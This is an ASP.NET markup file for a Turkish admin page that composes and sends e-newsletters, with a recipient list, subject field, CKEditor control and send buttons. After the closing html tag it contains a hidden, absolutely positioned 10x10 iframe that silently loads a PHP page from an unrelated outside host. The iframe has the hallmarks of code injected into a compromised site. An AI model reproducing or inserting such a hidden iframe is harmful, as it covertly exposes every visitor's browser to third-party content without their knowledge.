<%@ Page Language="C#" AutoEventWireup="true" CodeFile="BultenGonder.aspx.cs" Inherits="Yonetim_TurEkle" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<%@ Register Assembly="CKEditor.NET" Namespace="CKEditor.NET" TagPrefix="CKEditor" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
    <script src="../Library/App/Tabs/Tabs.js" type="text/javascript"></script>
    <link href="../Library/App/Tabs/Tabs.css" rel="stylesheet" type="text/css" />
    <script language="javascript" type="text/javascript">
        function ListeSecim(kontrol, durum) {
            var ctl = document.getElementById(kontrol);
            var inputs = ctl.getElementsByTagName('option');

            for (var i = 0; i < inputs.length; i++) {
                inputs[i].selected = durum;
            }
        }
</script>
</head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>E-Bülten Gönder</h2>
                        <fieldset>
                            <legend>E-Posta Gönder</legend>
                            <div>
                                <table width="100%">
                                    <tr>
                                        <td>
                                            <a href="javascript:ListeSecim('kisiler', true)">Tümünü Seç</a> /
                                            <a href="javascript:ListeSecim('kisiler', false)">Tümünü Kaldır</a></td>
                                        <td>
                                            &nbsp;</td>
                                    </tr>
                                    <tr>
                                        <td valign="top" width="300">
                                            <asp:ListBox ID="kisiler" runat="server" Height="525px" Width="290px" 
                                                SelectionMode="Multiple">
                                            </asp:ListBox>
                                        </td>
                                        <td valign="top">
                                            <asp:TextBox ID="form_konu" runat="server" Width="100%"></asp:TextBox>
                                            <br />
                                            <br />
                                      <CKEditor:CKEditorControl ID="mesaj" runat="server" 
                                      BasePath="~/Library/App/ckeditor" 
                                      ContentsCss="~/Library/App/ckeditor/contents.css" 
                                      TemplatesFiles="~/Library/App/ckeditor/plugins/templates/templates/default.js" 
                                      Toolbar="Full" ToolbarCanCollapse="False" ToolbarFull="Source|-|Preview|
Cut|Copy|Paste|PasteText|PasteFromWord|-|Print|SpellChecker|Scayt
Undo|Redo|-|Find|Replace|-|SelectAll|RemoveFormat|-|Bold|Italic|Underline|Strike||Subscript|Superscript
NumberedList|BulletedList|-|Outdent|Indent|Blockquote|CreateDiv
JustifyLeft|JustifyCenter|JustifyRight|JustifyBlock
Link|Unlink
Image|Flash|Table|SpecialChar|PageBreak|Styles|Format|Font|FontSize
TextColor|BGColor
Maximize|ShowBlocks|" FilebrowserBrowseUrl="/Library/App/ckfinder/ckfinder.html" 
                                      FilebrowserFlashBrowseUrl="/Library/App/ckfinder/ckfinder.html?type=Flash" 
                                      FilebrowserFlashUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Flash" 
                                      FilebrowserImageBrowseUrl="/Library/App/ckfinder/ckfinder.html?type=Images" 
                                      FilebrowserImageUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Images" 
                                      
                                                FilebrowserUploadUrl="/Library/App/ckfinder/core/connector/aspx/connector.aspx?command=QuickUpload&amp;type=Files" 
                                                Height="306px"></CKEditor:CKEditorControl>
                                        </td>
                                    </tr>
                                    </table>
                            </div>
                        </fieldset>
                            <fieldset>
                                    <legend>İşlemler</legend>
                                    <div>
                                        <asp:Button ID="Button1" runat="server" Text="E-Postaları Gönder" 
                                            onclick="Button1_Click" />&nbsp;<asp:Button ID="Button2" runat="server" 
                                            onclick="Button2_Click" Text="E-Bülten Listesi" />
                                    &nbsp;<asp:Button ID="Button3" runat="server" onclick="Button3_Click" 
                                            Text="Yeni E-Posta Adresi Ekle" />
                                    </div>
                                  </fieldset>
                        
                    </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




